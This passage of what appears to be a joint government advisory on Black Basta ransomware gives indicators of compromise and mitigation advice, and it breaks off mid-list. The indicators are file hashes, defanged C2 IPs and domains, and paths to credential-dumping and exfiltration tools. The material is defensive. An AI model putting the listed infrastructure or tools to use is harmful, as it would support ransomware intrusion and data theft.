<h3><strong>INDICATORS OF COMPROMISE</strong></h3>
<p>See Table 7 for IOCs obtained from FBI investigations.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 7: Malicious Files Associated with Black Basta Ransomware</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Hash</strong></th>
<th role=\"columnheader\"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>0112e3b20872760dda5f658f6b546c85f126e803e27f0577b294f335ffa5a298</td>
<td>rclone.exe</td>
</tr>
<tr>
<td>d3683beca3a40574e5fd68d30451137e4a8bbaca8c428ebb781d565d6a70385e</td>
<td>Winscp.exe</td>
</tr>
<tr>
<td>88c8b472108e0d79d16a1634499c1b45048a10a38ee799054414613cc9dccccc</td>
<td>DLL</td>
</tr>
<tr>
<td>58ddbea084ce18cfb3439219ebcf2fc5c1605d2f6271610b1c7af77b8d0484bd</td>
<td>DLL</td>
</tr>
<tr>
<td>39939eacfbc20a2607064994497e3e886c90cd97b25926478434f46c95bd8ead</td>
<td>DLL</td>
</tr>
<tr>
<td>5b2178c7a0fd69ab00cef041f446e04098bbb397946eda3f6755f9d94d53c221</td>
<td>DLL</td>
</tr>
<tr>
<td>51eb749d6cbd08baf9d43c2f83abd9d4d86eb5206f62ba43b768251a98ce9d3e</td>
<td>DLL</td>
</tr>
<tr>
<td>d15bfbc181aac8ce9faa05c2063ef4695c09b718596f43edc81ca02ef03110d1</td>
<td>DLL</td>
</tr>
<tr>
<td>5942143614d8ed34567ea472c2b819777edd25c00b3e1b13b1ae98d7f9e28d43</td>
<td>DLL</td>
</tr>
<tr>
<td>05ebae760340fe44362ab7c8f70b2d89d6c9ba9b9ee8a9f747b2f19d326c3431</td>
<td>DLL</td>
</tr>
<tr>
<td>a7b36482ba5bca7a143a795074c432ed627d6afa5bc64de97fa660faa852f1a6</td>
<td>DLL</td>
</tr>
<tr>
<td>86a4dd6be867846b251460d2a0874e6413589878d27f2c4482b54cec134cc737</td>
<td>DLL</td>
</tr>
<tr>
<td>07117c02a09410f47a326b52c7f17407e63ba5e6ff97277446efc75b862d2799</td>
<td>DLL</td>
</tr>
<tr>
<td>96339a7e87ffce6ced247feb9b4cb7c05b83ca315976a9522155bad726b8e5be</td>
<td><a>ELF</a></td>
</tr>
<tr>
<td>1c1b2d7f790750d60a14bd661dae5c5565f00c6ca7d03d062adcecda807e1779</td>
<td>ELF</td>
</tr>
<tr>
<td>360c9c8f0a62010d455f35588ef27817ad35c715a5f291e43449ce6cb1986b98</td>
<td>ELF</td>
</tr>
<tr>
<td>0554eb2ffa3582b000d558b6950ec60e876f1259c41acff2eac47ab78a53e94a</td>
<td><a>EXE</a></td>
</tr>
<tr>
<td>9a55f55886285eef7ffabdd55c0232d1458175b1d868c03d3e304ce7d98980bc</td>
<td>EXE</td>
</tr>
<tr>
<td>62e63388953bb30669b403867a3ac2c8130332cf78133f7fd4a7f23cdc939087</td>
<td>EXE</td>
</tr>
<tr>
<td>7ad4324ea241782ea859af12094f89f9a182236542627e95b6416c8fb9757c59</td>
<td>EXE</td>
</tr>
<tr>
<td>350ba7fca67721c74385faff083914ecdd66ef107a765dfb7ac08b38d5c9c0bd</td>
<td>EXE</td>
</tr>
<tr>
<td>90ba27750a04d1308115fa6a90f36503398a8f528c974c5adc07ae8a6cd630e7</td>
<td>EXE</td>
</tr>
<tr>
<td>fafaff3d665b26b5c057e64b4238980589deb0dff0501497ac50be1bc91b3e08</td>
<td>EXE</td>
</tr>
<tr>
<td>acb60f0dd19a9a26aaaefd3326db8c28f546b6b0182ed2dcc23170bcb0af6d8f</td>
<td>EXE</td>
</tr>
<tr>
<td>d73f6e240766ddd6c3c16eff8db50794ab8ab95c6a616d4ab2bc96780f13464d</td>
<td>EXE</td>
</tr>
<tr>
<td>f039eaaced72618eaba699d2985f9e10d252ac5fe85d609c217b45bc8c3614f4</td>
<td>EXE</td>
</tr>
<tr>
<td>723d1cf3d74fb3ce95a77ed9dff257a78c8af8e67a82963230dd073781074224</td>
<td>EXE</td>
</tr>
<tr>
<td>ae7c868713e1d02b4db60128c651eb1e3f6a33c02544cc4cb57c3aa6c6581b6e</td>
<td>EXE</td>
</tr>
<tr>
<td>fff35c2da67eef6f1a10c585b427ac32e7f06f4e4460542207abcd62264e435f</td>
<td>EXE</td>
</tr>
<tr>
<td>df5b004be71717362e6b1ad22072f9ee4113b95b5d78c496a90857977a9fb415</td>
<td>EXE</td>
</tr>
<tr>
<td>462bbb8fd7be98129aa73efa91e2d88fa9cafc7b47431b8227d1957f5d0c8ba7</td>
<td>EXE</td>
</tr>
<tr>
<td>3c50f6369f0938f42d47db29a1f398e754acb2a8d96fd4b366246ac2ccbe250a</td>
<td>EXE</td>
</tr>
<tr>
<td>5d2204f3a20e163120f52a2e3595db19890050b2faa96c6cba6b094b0a52b0aa</td>
<td>EXE</td>
</tr>
<tr>
<td>37a5cd265f7f555f2fe320a68d70553b7aa9601981212921d1ac2c114e662004</td>
<td>EXE</td>
</tr>
<tr>
<td>3090a37e591554d7406107df87b3dc21bda059df0bc66244e8abef6a5678af35</td>
<td>EXE</td>
</tr>
<tr>
<td>17879ed48c2a2e324d4f5175112f51b75f4a8ab100b8833c82e6ddb7cd817f20</td>
<td>EXE</td>
</tr>
<tr>
<td>42f05f5d4a2617b7ae0bc601dd6c053bf974f9a337a8fcc51f9338b108811b78</td>
<td>EXE</td>
</tr>
<tr>
<td>882019d1024778e13841db975d5e60aaae1482fcf86ba669e819a68ce980d7d3</td>
<td>EXE</td>
</tr>
<tr>
<td>e28188e516db1bda9015c30de59a2e91996b67c2e2b44989a6b0f562577fd757</td>
<td>EXE</td>
</tr>
<tr>
<td>0a8297b274aeab986d6336b395b39b3af1bb00464cf5735d1ecdb506fef9098e</td>
<td>EXE</td>
</tr>
<tr>
<td>69192821f8ce4561cf9c9cb494a133584179116cb2e7409bea3e18901a1ca944</td>
<td>EXE</td>
</tr>
<tr>
<td>3337a7a9ccdd06acdd6e3cf4af40d871172d0a0e96fc48787b574ac93689622a</td>
<td>EXE</td>
</tr>
<tr>
<td>17205c43189c22dfcb278f5cc45c2562f622b0b6280dcd43cc1d3c274095eb90</td>
<td>EXE</td>
</tr>
<tr>
<td>b32daf27aa392d26bdf5faafbaae6b21cd6c918d461ff59f548a73d447a96dd9</td>
<td>EXE</td>
</tr>
</tbody>
</table>
<p>See Tables 8–11 for IOCs obtained from trusted third-party reporting.</p>
<p><strong>Disclaimer:</strong> The authoring organizations recommend network defenders investigate or vet IP addresses prior to taking action, such as blocking, as many cyber actors are known to change IP addresses, sometimes daily, and some IP addresses may host valid domains.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 8: Network Indicators</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>IP Address</strong></th>
<th role=\"columnheader\"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>66.249.66[.]18</td>
<td>0gpw.588027fa.dns.realbumblebee[.]net, dns.trailshop[.]net, dns.artspathgroupe[.]net</td>
</tr>
<tr>
<td>66.249.66[.]18</td>
<td>my.2a91c002002.588027fa.dns.realbumblebee[.]net</td>
</tr>
<tr>
<td>66.249.66[.]18</td>
<td>fy9.39d9030e5d3a8e2352daae2f4cd3c417b36f64c6644a783b9629147a1.afd8b8a4615358e0313bad8c544a1af0d8efcec0e8056c2c8eee96c7.b06d1825c0247387e38851b06be0272b0bd619b7c9636bc17b09aa70.a46890f27.588027fa.dns.realbumblebee[.]net</td>
</tr>
<tr>
<td>95.181.173[.]227</td>
<td>adslsdfdsfmo[.]world</td>
</tr>
<tr>
<td>&nbsp;</td>
<td>fy9.36c44903529fa273afff3c9b7ef323432e223d22ae1d625c4a3957d57.015c16eff32356bf566c4fd3590c6ff9b2f6e8c587444ecbfc4bcae7.f71995aff9e6f22f8daffe9d2ad9050abc928b8f93bb0d42682fd3c3.445de2118.588027fa.dns.realbumblebee[.]net</td>
</tr>
<tr>
<td>207.126.152[.]242</td>
<td>xkpal.d6597fa.dns.blocktoday.net<br>nuher.3577125d2a75f6a277fc5714ff536c5c6af5283d928a66daad6825b9a.7aaf8bba88534e88ec89251c57b01b322c7f52c7f1a5338930ae2a50.cbb47411f60fe58f76cf79d300c03bdecfb9e83379f59d80b8494951.e10c20f77.7fcc0eb6.dns.blocktoday[.]net</td>
</tr>
<tr>
<td>72.14.196[.]50</td>
<td>.rasapool[.]net, dns.trailshop[.]net</td>
</tr>
<tr>
<td>72.14.196[.]192</td>
<td>.rasapool[.]net</td>
</tr>
<tr>
<td>72.14.196[.]2</td>
<td>.rasapool[.]net</td>
</tr>
<tr>
<td>72.14.196[.]226</td>
<td>.rasapool[.]net</td>
</tr>
<tr>
<td>46.161.27[.]151</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>207.126.152[.]242</td>
<td>nuher.1d67bbcf4.456d87aa6.2d84dfba.dns.specialdrills[.]com</td>
</tr>
<tr>
<td>185.219.221[.]136</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>64.176.219[.]106</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>5.78.115[.]67</td>
<td>your-server[.]de</td>
</tr>
<tr>
<td>207.126.152[.]242</td>
<td>xkpal.1a4a64b6.dns.blocktoday[.]net</td>
</tr>
<tr>
<td>46.8.16[.]77</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>185.7.214[.]79</td>
<td>VPN Server</td>
</tr>
<tr>
<td>185.220.100[.]240</td>
<td>Tor exit</td>
</tr>
<tr>
<td>107.189.30[.]69</td>
<td>Tor exit</td>
</tr>
<tr>
<td>5.183.130[.]92</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>185.220.101[.]149</td>
<td>Tor exit</td>
</tr>
<tr>
<td>188.130.218[.]39</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>188.130.137[.]181</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>46.8.10[.]134</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>155.138.246[.]122</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>80.239.207[.]200</td>
<td>winklen[.]ch</td>
</tr>
<tr>
<td>183.181.86[.]147</td>
<td>Xserver[.]jp</td>
</tr>
<tr>
<td>34.149.120[.]3</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>104.21.40[.]72</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>34.250.161[.]149</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>88.198.198[.]90</td>
<td>your-server[.]de; literoved[.]ru</td>
</tr>
<tr>
<td>35.244.153[.]44</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>35.212.86[.]55</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>34.251.163[.]236</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>34.160.81[.]203</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>34.149.36[.]179</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>104.21.26[.]145</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>83.243.40[.]10</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>35.227.194[.]51</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>35.190.31[.]54</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>34.120.190[.]48</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>116.203.186[.]178</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>34.160.17[.]71</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 9: File Indicators</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Filename</strong></th>
<th role=\"columnheader\"><strong>Hash</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>C:\\Users\\Public\\Audio\\Jun.exe</td>
<td>b6a4f4097367d9c124f51154d8750ea036a812d5badde0baf9c5f183bb53dd24</td>
</tr>
<tr>
<td>C:\\Users\\Public\\Audio\\esx.zip</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>C:\\Users\\Public\\Audio\\7zG.exe</td>
<td>f21240e0bf9f0a391d514e34d4fa24ecb997d939379d2260ebce7c693e55f061</td>
</tr>
<tr>
<td>C:\\Users\\Public\\Audio\\7z.dll</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>C:\\Users\\Public\\db_Usr.sql</td>
<td>8501e14ee6ee142122746333b936c9ab0fc541328f37b5612b6804e6cdc2c2c6</td>
</tr>
<tr>
<td>C:\\Users\\Public\\Audio\\db_Usr.sql</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>C:\\Users\\Public\\Audio\\hv2.ps1</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>C:\\Users\\Public\\7zG.exe</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>C:\\Users\\Public\\7z.dll</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>C:\\Users\\Public\\BitLogic.dll</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>C:\\Users\\Public\\NetApp.exe</td>
<td>4c897334e6391e7a2fa3cbcbf773d5a4</td>
</tr>
<tr>
<td>C:\\Users\\Public\\DataSoft.exe</td>
<td>2642ec377c0cee3235571832cb472870</td>
</tr>
<tr>
<td>C:\\Users\\Public\\BitData.exe</td>
<td>b3fe23dd4701ed00d79c03043b0b952e</td>
</tr>
<tr>
<td>C:\\Users\\Public\\DigitalText.dll</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>C:\\Users\\Public\\GeniusMesh.exe</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>\\Device\\Mup\\{redacted}\\C$\\Users\\Public\\Music\\PROCEXP.sys</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>\\Device\\Mup\\{redacted}\\C$\\Users\\Public\\Music\\DumpNParse86.exe</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>\\Device\\Mup\\{redacted}\\C$\\Users\\Public\\Music\\POSTDump.exe</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>\\Device\\Mup\\{redacted}\\C$\\Users\\Public\\Music\\DumpNParse.exe</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>C:\\Users\\Public\\socksps.ps1</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>C:\\Users\\Public\\Thief.exe</td>
<td>034b5fe047920b2ae9493451623633b14a85176f5eea0c7aadc110ea1730ee79</td>
</tr>
<tr>
<td>
<p>C:\\Users\\All Users\\{redacted}\\GWT.ps1</p>
<p>C:\\Program Files\\MonitorIT\\GWT.ps1</p>
</td>
<td>8C68B2A794BA3D148CAE91BDF9C8D357289752A94118B5558418A36D95A5A45F</td>
</tr>
<tr>
<td>
<p>Winx86.exe&nbsp;</p>
<p><strong>Comment:</strong> alias for cmd.exe</p>
</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>C:\\Users\\Public\\eucr.exe</td>
<td>3c65da7f7bfdaf9acc6445abbedd9c4e927d37bb9e3629f34afc338058680407</td>
</tr>
<tr>
<td>C:\\Windows\\DS_c1.dll</td>
<td>808c96cb90b7de7792a827c6946ff48123802959635a23bf9d98478ae6a259f9</td>
</tr>
<tr>
<td>C:\\Windows\\DS_c1.dll</td>
<td>3a8fc07cadc08eeb8be342452636a754158403c3d4ebff379a4ae66f8298d9a6</td>
</tr>
<tr>
<td>C:\\Windows\\DS_c1.dll</td>
<td>4ac69411ed124da06ad66ee8bfbcea2f593b5b199a2c38496e1ee24f9d04f34a</td>
</tr>
<tr>
<td>C:\\Windows\\DS_c1.dll</td>
<td>819cb9bcf62be7666db5666a693524070b0df589c58309b067191b30480b0c3a</td>
</tr>
<tr>
<td>C:\\Windows\\DS_c1.dll</td>
<td>c26a5cb62a78c467cc6b6867c7093fbb7b1a96d92121d4d6c3f0557ef9c881e0</td>
</tr>
<tr>
<td>C:\\Windows\\DS_c1.dll</td>
<td>d503090431fdd99c9df3451d9b73c5737c79eda6eb80c148b8dc71e84623401f</td>
</tr>
<tr>
<td>*\\instructions_read_me.txt</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 10: Known Black Basta Cobalt Strike Domains</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Domain</strong></th>
<th role=\"columnheader\"><strong>Date/Time (UTC)/Time (UTC)</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>trailshop[.]net</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>realbumblebee[.]net</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>recentbee[.]net</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>investrealtydom[.]net</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>webnubee[.]com</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>artspathgroup[.]net</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>buyblocknow[.]com</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>currentbee[.]net</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>modernbeem[.]net</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>startupbusiness24[.]net</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>magentoengineers[.]com</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>childrensdolls[.]com</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>myfinancialexperts[.]com</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>limitedtoday[.]com</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>kekeoamigo[.]com</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>nebraska-lawyers[.]com</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>tomlawcenter[.]com</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>thesmartcloudusa[.]com</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>rasapool[.]net</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>artspathgroupe[.]net</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>specialdrills[.]com</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>thetrailbig[.]net</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>consulheartinc[.]com</td>
<td>3/22/2024 15:35</td>
</tr>
<tr>
<td>otxcosmeticscare[.]com</td>
<td>3/15/2024 10:14</td>
</tr>
<tr>
<td>otxcarecosmetics[.]com</td>
<td>3/15/2024 10:14</td>
</tr>
<tr>
<td>artstrailman[.]com</td>
<td>3/15/2024 10:14</td>
</tr>
<tr>
<td>ontexcare[.]com</td>
<td>3/15/2024 10:14</td>
</tr>
<tr>
<td>trackgroup[.]net</td>
<td>3/15/2024 10:14</td>
</tr>
<tr>
<td>businessprofessionalllc[.]com</td>
<td>3/15/2024 10:14</td>
</tr>
<tr>
<td>securecloudmanage[.]com</td>
<td>3/7/2024 10:42</td>
</tr>
<tr>
<td>oneblackwood[.]com</td>
<td>3/7/2024 10:42</td>
</tr>
<tr>
<td>buygreenstudio[.]com</td>
<td>3/7/2024 10:42</td>
</tr>
<tr>
<td>startupbuss[.]com</td>
<td>3/7/2024 10:42</td>
</tr>
<tr>
<td>onedogsclub[.]com</td>
<td>3/4/2024 18:26</td>
</tr>
<tr>
<td>wipresolutions[.]com</td>
<td>3/4/2024 18:26</td>
</tr>
<tr>
<td>recentbeelive[.]com</td>
<td>3/4/2024 18:26</td>
</tr>
<tr>
<td>trailcocompany[.]com</td>
<td>3/4/2024 18:26</td>
</tr>
<tr>
<td>trailcosolutions[.]com</td>
<td>3/4/2024 18:26</td>
</tr>
<tr>
<td>artstrailreviews[.]com</td>
<td>3/4/2024 18:26</td>
</tr>
<tr>
<td>usaglobalnews[.]com</td>
<td>2/15/2024 5:56</td>
</tr>
<tr>
<td>topglobaltv[.]com</td>
<td>2/15/2024 5:56</td>
</tr>
<tr>
<td>startupmartec[.]net</td>
<td>2/15/2024 5:56</td>
</tr>
<tr>
<td>technologgies[.]com</td>
<td>1/2/2024 18:16</td>
</tr>
<tr>
<td>jenshol[.]com</td>
<td>1/2/2024 18:16</td>
</tr>
<tr>
<td>simorten[.]com</td>
<td>1/2/2024 18:16</td>
</tr>
<tr>
<td>investmentgblog[.]net</td>
<td><a>1/2/2024 18:16</a></td>
</tr>
<tr>
<td>protectionek[.]com</td>
<td>1/2/2024 18:16</td>
</tr>
</tbody>
</table>
<table>
<caption><em>Table 11: Suspected Black Basta Domains</em></caption>
<tbody>
<tr>
<td>airbusco[.]net</td>
</tr>
<tr>
<td>allcompanycenter[.]com</td>
</tr>
<tr>
<td>animalsfast[.]net</td>
</tr>
<tr>
<td>audsystemecll[.]net</td>
</tr>
<tr>
<td>auuditoe[.]com</td>
</tr>
<tr>
<td>bluenetworking[.]net</td>
</tr>
<tr>
<td>brendonline[.]com</td>
</tr>
<tr>
<td>businesforhome[.]com</td>
</tr>
<tr>
<td>caspercan[.]com</td>
</tr>
<tr>
<td>clearsystemwo[.]net</td>
</tr>
<tr>
<td>cloudworldst[.]net</td>
</tr>
<tr>
<td>constrtionfirst[.]com</td>
</tr>
<tr>
<td>erihudeg[.]com</td>
</tr>
<tr>
<td>garbagemoval[.]com</td>
</tr>
<tr>
<td>gartenlofti[.]com</td>
</tr>
<tr>
<td>getfnewsolutions[.]com</td>
</tr>
<tr>
<td>getfnewssolutions[.]com</td>
</tr>
<tr>
<td>investmendvisor[.]net</td>
</tr>
<tr>
<td>investmentrealtyhp[.]net</td>
</tr>
<tr>
<td>ionoslaba[.]com</td>
</tr>
<tr>
<td>jessvisser[.]com</td>
</tr>
<tr>
<td>karmafisker[.]com</td>
</tr>
<tr>
<td>kolinileas[.]com</td>
</tr>
<tr>
<td>maluisepaul[.]com</td>
</tr>
<tr>
<td>masterunix[.]net</td>
</tr>
<tr>
<td>monitor-websystem[.]net</td>
</tr>
<tr>
<td>monitorsystem[.]net</td>
</tr>
<tr>
<td>mytrailinvest[.]net</td>
</tr>
<tr>
<td>prettyanimals[.]net</td>
</tr>
<tr>
<td>reelsysmoona[.]net</td>
</tr>
<tr>
<td>seohomee[.]com</td>
</tr>
<tr>
<td>septcntr[.]com</td>
</tr>
<tr>
<td>softradar[.]net</td>
</tr>
<tr>
<td>startupbizaud[.]net</td>
</tr>
<tr>
<td>startuptechnologyw[.]net</td>
</tr>
<tr>
<td>steamteamdev[.]net</td>
</tr>
<tr>
<td>stockinvestlab[.]net</td>
</tr>
<tr>
<td>taskthebox[.]net</td>
</tr>
<tr>
<td>trailgroupl[.]net</td>
</tr>
<tr>
<td>treeauwin[.]net</td>
</tr>
<tr>
<td>unitedfrom[.]com</td>
</tr>
<tr>
<td>unougn[.]com</td>
</tr>
<tr>
<td>wardeli[.]com</td>
</tr>
<tr>
<td>welausystem[.]net</td>
</tr>
<tr>
<td>wellsystemte[.]net</td>
</tr>
<tr>
<td>withclier[.]com</td>
</tr>
</tbody>
</table>
<h3><strong>MITIGATIONS</strong></h3>
<p>The authoring organizations recommend all critical infrastructure organizations implement the mitigations below to improve your organization’s cybersecurity posture based on Black Basta’s activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s&nbsp;<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">Cross-Sector Cybersecurity Performance Goals</a> for more information on the CPGs, including additional recommended baseline protections.</p>
<ul>
<li><strong>Install updates for operating systems, software, and firmware as soon as they are released</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#MitigatingKnownVulnerabilities1E\" title=\"Mitigating Known Vulnerabilities (1.E)\">CPG 1.E</a>]. Prioritize updating <a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" title=\"Known Exploited Vulnerabilities Catalog\">Known Exploited Vulnerabilities (KEV)</a>.</li>
<li><strong>Require phishing-resistant multi-factor authentication (MFA)</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#PhishingResistantMultifactorAuthenticationMFA2H\" title=\"Phishing-Resistant Multifactor Authentication (MFA) (2.H)\">CPG 2.H</a>] for as many services as possible.</li>
<li><strong>Implement recommendations, including training users to recognize and report phishing attempts&nbsp;</strong>[<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#BasicCybersecurityTraining2I\" title=\"Basic Cybersecurity Training (2.I)\">CPG 2.I</a>], from joint <a href=\"https://www.cisa.gov/resources-tools/resources/phishing-guidance-stopping-attack-cycle-phase-one\" title=\"Phishing Guidance: Stopping the Attack Cycle at Phase One\">Phishing Guidance: Stopping the Attack Cycle at Phase One</a>.</li>
<li><strong>Secure remote access software</strong> by applying mitigations from joint <a href=\"https://www.cisa.gov/resources-tools/resources/guide-securing-remote-access-software\" title=\"Guide to Securing Remote Access Software\">Guide to Securing Remote Access Software</a>.</li>
<li><strong>Make backups of critical systems and device configurations</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SystemBackups2R\" title=\"System Backups (2.R)\">CPG 2.R</a>] to enable devices to be repaired and restored.</li>
<li><strong>Apply mitigations from the joint&nbsp;</strong><a href=\"https://www.cisa.gov/stopransomware/ransomware-guide\" title=\"#StopRansomware Guide\"><strong>#StopRansomware Guide</strong></a>.</li>
</ul>
<p>The authoring organizations also recommend network defenders of HPH Sector and other critical infrastructure organizations to reference CISA’s <a href=\"https://www.cisa.gov/resources-tools/resources/mitigation-guide-healthcare-and-public-health-hph-sector\" title=\"Mitigation Guide: Healthcare and Public Health (HPH) Sector\">Mitigation Guide: Healthcare and Public Health (HPH) Sector</a> and HHS’s <a href=\"https://hphcyber.hhs.gov/performance-goals.html\" title=\"HPH Cybersecurity Performance Goals\">HPH Cybersecurity Performance Goals</a>, which provide best practices to combat pervasive cyber threats against organizations. Recommendations include the following:</p>
<ul>
<li><strong>Asset Management and Security</strong>: Cybersecurity professionals should identify and understand all relationships or interdependencies, functionality of each asset, what it exposes, and what software is running to ensure critical data and systems are protected appropriately. HPH Sector organizations should ensure&nbsp;electronic PHI (ePHI) is protected and compliant with the Health Insurance Portability and Accountability Act (HIPAA). Organizations can complete asset inventories using active scans, passive processes, or a combination of both techniques.</li>
<li><strong>Email Security and Phishing Prevention</strong>: Organizations should install modern anti-malware software and automatically update signatures where possible. For additional guidance, see CISA’s <a href=\"https://www.cisa.gov/resources-tools/resources/enhance-email-web-security\" title=\"Enhance Email &amp; Web Security\">Enhance Email and Web Security Guide</a>.
<ul>
<li><strong>Check for embedded or spoofed hyperlinks</strong>: Validate the URL of the link matches the text of the link itself. This can be achieved by hovering your cursor over the link to view the URL of the website to be accessed.</li>
</ul>
</li>
<li><strong>Access Management</strong>: Phishing-resistant MFA completes the same process but removes ‘people’ from the equation to help thwart social engineering scams and targeted phishing attacks that may have been successful using traditional MFA. The two main forms of phishing-resistant MFA are FIDO/Web Authentication (WebAuthn) authentication and Public Key Infrastructure (PKI)-based authentication. Prioritize phishing-resistant MFA on accounts with the highest risk, such as privileged administrative accounts on key assets. For additional information on phishing-resistant MFA, see CISA’s <a href=\"https://www.cisa.gov/sites/default/files/publications/fact-sheet-implementing-phishing-resistant-mfa-508c.pdf\" title=\"Implementing Phishing-Resistant MFA Guide\">Implementing Phishing-Resistant MFA Guide</a>.</li>
<li><strong>Vulnerability Management and Assessment</strong>: Once vulnerabilities are identified across your environment, evaluate and prioritize to appropriately deal with the posed risks according to your organization’s risk strategy. To assist with prioritization, it is essential to:
<ul>
<li><strong>Map your assets to business-critical functions.</strong> For vulnerability remediation, prioritize assets that are most critical for ongoing operations or which, if affected, could impact your organization’s business continuity, sensitive PII (or PHI) security, reputation, or financial position.</li>
<li><strong>Use threat intelligence information.</strong> For remediation, prioritize vulnerabilities actively exploited by threat actors. To assist, leverage CISA’s <a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" title=\"Known Exploited Vulnerabilities Catalog\">KEV Catalog</a> and other threat intelligence feeds.</li>
<li><strong>Leverage prioritization methodologies, ratings, and scores</strong>. The Common Vulnerability Scoring System (CVSS) assesses the technical severity of vulnerabilities. The Exploit Prediction Scoring System (EPSS) measures the likelihood of exploitation and can help with deciding which vulnerabilities to prioritize. CISA’s <a href=\"https://www.cisa.gov/stakeholder-specific-vulnerability-categorization-ssvc\" title=\"Stakeholder-Specific Vulnerability Categorization (SSVC)\">Stakeholder-Specific Vulnerability Categorization (SSVC)</a> methodology leverages decision trees to prioritize relevant vulnerabilities into four decisions, Track, Track*, Attend, and Act based on exploitation status, technical impact, mission prevalence, and impacts to safety and public-wellbeing.</li>
</ul>
</li>
</ul>
<h3><strong>VALIDATE SECURITY CONTROLS</strong></h3>
<p>In addition to applying mitigations, the authoring organizations recommend exercising, testing, and validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&amp;CK for Enterprise framework in this advisory. The authoring organizations recommend testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory.</p>
<p>To get started:</p>
<ol>
